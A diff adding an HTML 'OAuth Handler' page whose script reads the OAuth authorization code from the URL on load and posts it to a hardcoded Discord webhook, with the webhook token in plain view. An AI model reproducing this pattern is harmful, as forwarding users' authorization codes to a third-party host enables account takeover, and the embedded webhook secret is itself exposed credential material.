@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAuth Handler</title>
+</head>
+
+<body>
+
+<script>
+    // Extract the code parameter from the URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
+
+    if (code) {
+        // If the code parameter exists, send it to the Discord webhook
+        const webhookURL = "https://discord.com/api/webhooks/1152319251110182992/zCbXlSXAzKvOmV41VswSVUh1Z7IU7SEJPG0awuWCyYBvZ0TTj6kiFwFOHCR0xnA9g4qA";
+        
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: `Received an authorization code: ${code}`
+            }),
+        }).then(response => {
+            if (response.ok) {
+                document.body.innerHTML = 'Data sent to Discord via webhook!';
+            } else {
+                document.body.innerHTML = 'Error sending data to Discord.';
+            }
+        });
+    } else {
+        document.body.innerHTML = 'No authorization code found in the URL.';
+    }
+</script>
+
+</body>
+</html>
